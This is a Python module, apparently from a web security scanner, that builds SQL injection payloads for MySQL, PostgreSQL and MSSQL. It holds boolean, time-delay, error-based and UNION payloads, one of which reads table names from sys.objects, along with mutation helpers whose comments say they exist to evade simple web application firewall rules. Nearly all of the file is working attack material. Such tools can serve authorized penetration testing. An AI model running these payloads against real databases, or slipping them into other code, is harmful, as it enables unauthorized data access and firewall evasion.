from typing import List, Dict, Callable, Optional
import urllib.parse
import random

# Seed payloads and templates (data-driven so they can be extended)
# Boolean payloads: (true, false) - variants for different quote/comment contexts
BOOLEAN_PAIRS = [
    (" AND 1=1", " AND 1=2"),
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    (" AND 1=1--", " AND 1=2--"),
    ("' OR 'a'='a'--", "' OR 'a'='b'--"),
    ("' OR 1=1--", "' OR 1=0--"),
    ("' OR 1=1/*", "' OR 1=0/*"),
    ("\" OR 1=1--", "\" OR 1=0--"),
    ("\" OR 1=1/*", "\" OR 1=0/*"),
    ("') OR '1'='1", "') OR '1'='0"),
    ("') OR 1=1--", "') OR 1=0--"),
    ("\") OR 1=1--", "\") OR 1=0--"),
]

# Time-based templates (db_label, template) - multiple variants for wrapper flexibility
TIME_BASED = [
    # MySQL: SLEEP direct
    ("mysql", " AND SLEEP({delay})"),
    ("mysql", " AND 0=SLEEP({delay})"),
    ("mysql", "' AND SLEEP({delay})"),
    ("mysql", "' AND 0=SLEEP({delay})--"),
    ("mysql", "\" AND SLEEP({delay})"),
    ("mysql", "\" AND 0=SLEEP({delay})--"),
    # MySQL: BENCHMARK (CPU-based, alternative)
    ("mysql", " AND 0=BENCHMARK(5000000,MD5(1))"),
    ("mysql", "' AND 0=BENCHMARK(5000000,MD5(1))--"),
    ("mysql", "\" AND 0=BENCHMARK(5000000,MD5(1))--"),
    # PostgreSQL
    ("pgsql", " AND pg_sleep({delay})"),
    ("pgsql", "' AND pg_sleep({delay})--"),
    ("pgsql", "\" AND pg_sleep({delay})--"),
    # MSSQL: WAITFOR DELAY - variants with comments, quotes, parens
    ("mssql", " AND WAITFOR DELAY '00:00:{delay}'"),
    ("mssql", " WAITFOR DELAY '00:00:{delay}'/*"),
    ("mssql", " WAITFOR DELAY '00:00:{delay}'--"),
    ("mssql", "' WAITFOR DELAY '00:00:{delay}'--"),
    ("mssql", "' WAITFOR DELAY '00:00:{delay}'/*"),
    ("mssql", "\" WAITFOR DELAY '00:00:{delay}'--"),
    ("mssql", "\" WAITFOR DELAY '00:00:{delay}'/*"),
    ("mssql", ") WAITFOR DELAY '00:00:{delay}'--"),
    ("mssql", ")) WAITFOR DELAY '00:00:{delay}'/*"),
    ("mssql", "') WAITFOR DELAY '00:00:{delay}'--"),
    ("mssql", "\") WAITFOR DELAY '00:00:{delay}'--"),
    # MSSQL: Stacked queries (end of value/statement)
    ("mssql", "; WAITFOR DELAY '00:00:{delay}'--"),
    ("mssql", "; WAITFOR DELAY '00:00:{delay}';--"),
]

# Error-based payloads (attempt to trigger DB errors)
ERROR_BASED = [
    ("mssql", " AND 1/(SELECT 0)"),
    ("mssql", "' AND 1/0--"),
]

# Union / visible payload seeds (may require tuning for column counts)
UNION_BASED = [
    ("mssql", "' UNION SELECT NULL--"),
    ("mssql", "' UNION SELECT TOP 1 name FROM sys.objects--"),
]


def get_boolean_pairs() -> List[Dict[str, str]]:
    return [{"true": t, "false": f} for t, f in BOOLEAN_PAIRS]


def get_time_payloads(delay: int) -> List[Dict[str, str]]:
    return [{"db": db, "payload": tpl.format(delay=delay)} for db, tpl in TIME_BASED]


# --- Mutation / obfuscation helpers ---
def _mutate_case(s: str) -> str:
    return random.choice([s.upper(), s.lower(), s.swapcase()])


def _insert_comment_spaces(s: str) -> str:
    # replace ordinary spaces with SQL comment sequence to evade simple WAF rules
    return s.replace(" ", "/**/")


def _url_encode(s: str) -> str:
    return urllib.parse.quote_plus(s)


def _hex_encode_string(s: str) -> str:
    # Represent the bytes as 0x.. which can be used in some contexts
    return "0x" + s.encode("utf-8").hex()


_MUTATORS: List[Callable[[str], str]] = [_mutate_case, _insert_comment_spaces, _url_encode, _hex_encode_string]


def generate_payloads(seed_type: str = "boolean", db: str = "mssql", obfuscate: bool = False, depth: int = 1, delay: int = 5, max_results: int = 50, seed: Optional[int] = None) -> List[Dict[str, str]]:
    """
    Generate SQL injection payloads from seeds with optional obfuscation/mutation.

    - `seed_type`: one of 'boolean', 'time', 'error', 'union', 'stack'
    - `db`: database label to filter seeds (e.g., 'mssql', 'mysql', 'pgsql')
    - `obfuscate`: apply mutations to seeds
    - `depth`: how many mutators to chain (1..len(mutators))
    - `delay`: used for time-based payload templates
    - `seed`: for deterministic/reproducible payload generation (for testing)
    """
    # allow deterministic output for testing/debugging
    if seed is not None:
        random.seed(seed)

    seeds: List[Dict[str, str]] = []
    if seed_type == "boolean":
        seeds = [{"db": None, "payload": p[0]} for p in BOOLEAN_PAIRS] + [{"db": None, "payload": p[1]} for p in BOOLEAN_PAIRS]
    elif seed_type == "time":
        seeds = [{"db": db_label, "payload": tpl.format(delay=delay)} for db_label, tpl in TIME_BASED]
    elif seed_type == "error":
        seeds = [{"db": db_label, "payload": tpl} for db_label, tpl in ERROR_BASED]
    elif seed_type == "union":
        seeds = [{"db": db_label, "payload": tpl} for db_label, tpl in UNION_BASED]
    elif seed_type == "stack":
        # stacked variants are available in TIME_BASED or can be created from union/error seeds
        seeds = [{"db": db_label, "payload": tpl.format(delay=delay) if "{delay}" in tpl else tpl} for db_label, tpl in TIME_BASED]
    else:
        seeds = []

    # filter by DB if provided
    if db:
        seeds = [s for s in seeds if s.get("db") is None or s.get("db") == db]

    out: List[Dict[str, str]] = []
    for s in seeds:
        base = s["payload"]
        out.append({"db": s.get("db"), "payload": base, "meta": {"seed_type": seed_type, "mutated": False}})

        if obfuscate:
            # produce chained mutations up to `depth` applied randomly
            mutators = _MUTATORS[:]
            for _ in range(depth):
                if not mutators:
                    break
                m = random.choice(mutators)
                try:
                    mutated = m(base)
                    out.append({"db": s.get("db"), "payload": mutated, "meta": {"seed_type": seed_type, "mutated": True, "mutator": m.__name__}})
                except Exception:
                    continue
                # optionally allow repeated different mutations
                if len(out) >= max_results:
                    break
        if len(out) >= max_results:
            break

    return out
